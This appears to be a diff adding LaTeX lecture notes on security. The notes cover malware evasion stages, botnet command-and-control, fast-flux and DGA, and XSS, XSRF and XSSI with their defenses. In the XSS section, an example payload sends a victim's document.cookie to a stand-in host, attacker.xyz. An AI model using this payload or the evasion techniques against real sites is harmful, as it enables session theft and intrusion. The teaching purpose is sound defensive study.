@@ -1,0 +1,200 @@
+\section{Malware creation \& Botnets}
+
+\pgra{Malware live-demo:} freeware construction kits are available (require no expertise), tools have generally very high built-in security mechanisms (strong crypto, auth.) $\to$ prevent detection/takeover by competitors
+
+\pgra{Malware business case:} (1) persist \& avoid detection (password interception, steal valuable info) $\to$ (2) move to active attacks (further monetize, risk of detection justified) $\to$ (3) ``Throw away agent'' (sell/rent to clueless idiots)
+
+\pgra{Exploitation phases:}
+\begin{enumerate}
+\item ID theft (keylogger, local proxy/sniffer, PII stealing)
+\item Peer \& social attacks (trust misuse, social context)
+\item Local attacks (attack LAN, intranet, VPN, USB stick propagation)
+\item Attack support (host malware, proxying)
+\item External attacks (scanning, send spam, DDoS)
+\end{enumerate}
+
+\pgra{Best utilization:} BUILD UP (efficiently \& spread infection) $\to$ PERSIST (prevent detection \& removal) $\to$ BE MODULAR (address changing functionality needs) $\to$ SCALE (handle many machines) $\to$ ADAPT (to business/tech challenges) $\to$ ANONYMIZE (prevent identification of operator) 
+
+\pgra{Detection evasion techniques:} The following help malware to stay undetected:
+\bitem{
+\item Create unique samples of malware at massive scale ($20.000+$ variants) doing the same thing $\Rightarrow$ polymorphism
+\item Protect from analysis (icing)
+\item Detect sandboxing technologies
+\item Test detectability
+}
+
+\pgra{Serial Variants/Permutation:} automatically spitting out new variants of malware on a massive scale.\\
+As soon as anti-vir. detects a batch of malware samples, release a new (undetected) batch.
+
+Stages:
+\begin{enumerate}
+\item Original malware: write code, hire coder, buy it, do-it-yourself kit
+\item Cryptors: encrypt $\to$ evade signature detection, make static analysis inefficient, partially (sector-wise) encrypt software
+\item Protectors: anti-debugging (monitor processes, timestamps, self-debug), anti-sandboxing
+\item Packers: make binary code smaller/more portable, speed up infection (detection harder), polymorphic output (different output every time malware is packed)
+\item Binders: embed malware in executables frequently downloaded \& searched for
+\item Quality assurance: run malware against anti-vir. engines using underground tools, throw away if detected
+\end{enumerate} 
+
+\pgra{Polymorphism:} mutation of code while keeping the original algorithms intact (providing a common functionality).\\
+Swap equivalent code constructs ({\tt while} with {\tt for}, etc.), change code order, insert noise (i.e. {\tt if(!sqrt(a) < 0) }), modify compiler settings
+
+\pgra{Arms race:} $286 \cdot 10^{6}$ samples found in 2010.\\
+25\% of 123 exploits missed by top 10 prevention programs.\\
+40\% missed after slight modifications of exploits.\\
+9\% of enterprise endpoints bot-infected.
+
+\subs{Botnets}
+
+\pgra{Definition:} a network of compromised machines (bots) getting instructions from a command \& control center (botmaster, mothership).
+
+\pgra{C \& C:} is usually well hidden behind some distributed and redundant proxies, that are relaying commands from the botmaster to the network of managed bots (workers).
+
+The botmaster needs to be able to
+\bitem{
+\item distribute new instructions and malicious capabilities
+\item robustly manage $10,000+$ globally distributed agents,
+\item resist attacks (hijacks) by competitors and/or researchers
+}
+
+\pgra{Bot command models:} \textit{No control:} default malicious behavior, self-propagation. \\
+\textit{Private channels:} custom and covert channels, abuse common protocols\\
+\textit{Public channels:} use commond applications APIs, 95\% of today's botnets \\
+\textit{Resilient hybrids:} default malicious behavior, fall-back plans if C\&C  unavailable 
+
+\pgra{Topologies:} A botnet will employ some form of the following topologies:
+
+\lbtab{0.2}{0.35}{0.35}{
+Type & Advantage & Disadvantage \\
+\hline
+\hline
+\textbf{Star} & Speed & Single point of failure \\
+\hline
+\textbf{Multi-server} & Geographical optimization. No single point of failure & Advanced planning required \\
+\hline
+\textbf{Hierarchical} & Botnet enumeration very difficult. Easy to rescale & Command latency \\
+\hline
+\textbf{p2p (random)} & Highly resilient & Command latency. Botnet enumeration possible (``mapping out''). Needs auth. mechanism for identification of C\&C commands \\
+}
+
+\pgra{IP Flux \& Domain Flux:} \emph{IP Flux:} constant change of IP addr. info related to particular FQDN ({\tt cnc.net} $\to$ multiple IPs). ``Fast-Flux'': change of IP addr. set every 3-5 minutes. \\
+\emph{Domain Flux:} constant change and alloc. of multiple FQDN ({\tt cnc.net, cnc.ru, abc.net} $\to$ multiple IPs).
+
+\pgra{Single Flux:} FQDN of the C\&C's host has multiple IP addresses (DNS {\tt A} records).
+
+\pgra{Double Flux:} Multiple nameservers of C\&C have multiple IP addr. assigned (DNS {\tt A} and {\tt NS} records)
+
+\pgra{DNS protocol features exploited:} round robin allocation of IPs, very short TTL (time to live) for IPs
+
+\pgra{Domain Flux:}
+\bitem{
+\item DGA (Domain Generation Algorithm) used by bot(s) to periodically compute a list of new domain names (for the C\&C)
+\item DGA computed independently and regenerated periodically
+\item Bots attempt to connect to hosts in generated list until successful
+\item If a domain gets blocked $\to$ go to next in list
+}
+
+\textbf{Botmaster needs at least one domain operational.}
+
+\pgra{Sinkholing:} attempt to take down/over botnet by registering domains found in DGA.\\
+\emph{Requirements:} reverse-engineering the DGA, breaking/figuring out the auth. mechanism for the C\&C
+
+\textit{Generally too expensive to register all domains in DGA (90-130 million \$). The bot operators have a giant advantage!}
+
+\section{Cross-Site Scripting (XSS)}
+
+\pgra{Browser/JavaScript Same-Origin Policy} Same-origin policy defines access rights: A script can
+only access content and properties of a document loaded from the same origin as the document containing the script. Same origin means: same protocol, same hostname, same port.\\ Examples: script in a document loaded from {\tt site.tld} can access documents {\tt site.tld/here} \& {\tt site.tld/a/there} but not {\tt site.tld:8080/there} or {\tt bank.tld/yonder}.\\
+\textbf{Never include scripts you don‘t trust:} \\
+{\tt <script src=“http://you.tld/cnt.js“></script>}
+
+the script loaded from {\tt you.tld} is evaluated in the context of origin {\tt me.tld}! 
+
+\pgra{Cross-Site Scripting (XSS) Attacks:} \textit{XSS Vulnerability:} ``XSS flaws'' occur whenever a web application takes user supplied data and sends it to a web browser without first validating that content.\\
+\textit{XSS Attack:} 
+\begin{enumerate}
+\item XSS vulnerability used to inject code into a web page
+\item Code is executed in the victim‘s browser under the web site‘s domain (hijack user sessions, deface web sites, introduce worms)
+\end{enumerate}
+
+\textit{XSS attack targets the user of the system rather than the system itself (unlike SQL injection).}
+
+\pgra{Means to feed XSS exploit code:} XSS code can be embedded in: email, forum or chat message, PDF/Word and similar documents, uploaded file (CSS), webpage with third party content (Ads, user content, counters) \\
+XSS Attack examples: Change look of website, auto-post messages in the name of some other user
+
+\pgra{Root causes for XSS:} there are two primary root causes for XSS
+
+\lbtab{0.3}{0.3}{0.3}{
+Cause & Remedy & Problems \\
+\hline
+\hline
+Partial or missing user input sanitization & Attempt to filter out meta-characters ({\tt <, >, / } etc.) & Blacklisting complicated/incomplete, appl. becomes less user-friendly \\
+\hline
+Partial or missing HTML output encoding & Ensure that every user supplied parameter is HTML output encoded before it is send to the web browser ({\tt <} $\mapsto$ {\tt \&lt;}) & \\
+}
+
+\pgra{Usual places for Javascript:}
+\begin{enumerate}
+\item Inline code block as part of a web page
+\item Including an external file containing javascript
+\item Executing javascript code when an event is triggered.
+\end{enumerate}
+
+\pgra{How to prevent XSS in your web app:} HTML Output encoding (escaping) is good, but not always sufficient. Consider also:
+\bitem{
+\item Attribute injection: e.g. {\tt <img src=\% (image\_url)s>}
+\item Style attributes: inject javascript code into style attr. 
+\item Tags injection
+\item Different character sets
+\item Javascript event handlers (onerror, onescape, etc)
+\item AJAX applications
+}
+
+\pgra{Protecting against XSS attacks}
+\bitem{
+\item Golden rule: Do proper HTML output encoding of any user input: replace {\tt <script>alert("XSS");</script>} with {\tt \%lt;script\&gt;alert(\&quot;XSS\&quot;);} 
+\\{\tt \&lt;/script\&gt}
+\item ASP.NET: Use {\tt HTTPUtility.HTMLEncode(foo)} and validate user input
+\item PHP: use {\tt htmlentities(foo)} for HTML output encoding, and {\tt urlencode(foo)} for GET arguments
+\item Ruby: use {\tt h(foo)}
+\item JSP: Use Struts with {\tt <bean:write...>}
+\item Perl: Use Template Toolkit {\tt [\% HTML.escape(foo) \%]}
+}
+
+\pgra{Defense overview:} Summarizing:
+
+\begin{tabular}{p{0.15\linewidth}p{0.17\linewidth}p{0.13\linewidth}p{0.4\linewidth}}
+Output encoding & Input validation & Security token & Other prevention mechanisms \\
+\hline
+\hline
+\multicolumn{4}{l}{\textbf{Cross-Site Scripting (XSS)}} \\
+\hline
+Yes & Yes & No & Don't expect user input to be valid \& sanitized \\
+\multicolumn{4}{l}{\textbf{Cross-Site Request Forgery (XSRF)}} \\
+\hline
+No & (Yes) & Yes & Ask for old password/CAPTCHA. Check HTTP REFERER \\
+\multicolumn{4}{l}{\textbf{Cross-Site Script Inclusion (XSSI): direct sourcing}} \\
+\hline
+No & No & No & Don't ever include untrusted code. Serve code from your own website after checking it. \\
+\multicolumn{4}{l}{\textbf{Cross-Site Script Inclusion (XSSI): call-back}} \\
+\hline
+No & No & Yes & Restrict requests to HTTP POST. Check HTTP REFERER \\
+\end{tabular}
+
+\pgra{MySpace XSS Worm:} {\tt javascript} stripped from any text, but not {\tt java[enter]script}
+
+\pgra{Data Leakage XSS Attack:} {\tt Sillyshop.xyz} has a XSS flaw that embeds URL in {\tt prod\_id}
+
+http://www.sillyshop.xyz/showproduct.asp?prod\_id=7\\
+$<$script$>$￼document.write('$<$img\%20src=\\
+"http://www.attacker.xyz/capture.php?cookie=',\\
+escape(document.cookie),'"$>$')$<$/script$>$
+
+Malicious actions: get victim‘s cookie and alter orders, purchase with his credit card, reset account pwd, etc.
+
+\pgra{XSS Prevention:} HttpOnly cookies, can‘t be read by client script, not widely supported ￼￼parameter in webpage
+
+\pgra{XSRF - Cross-Site Request Forgery:} A form from one domain posts a request to a different domain through an authenticated session. Website {\tt attacker.tld} uses a form in a hidden {\tt iframe} to automatically post a new password to a web service, where the victim is currently logged in. \textit{Write-only attack.}\\
+\textit{Remedy:} Use a hidden security token, ask for old password, captcha, http referer headers
+
+\pgra{XSSI - Cross Site Script Inclusion:} Information leakage via callback/dynamic script. Prevent with security token, restriction of requests to HTTP POST, check HTTP REFERER
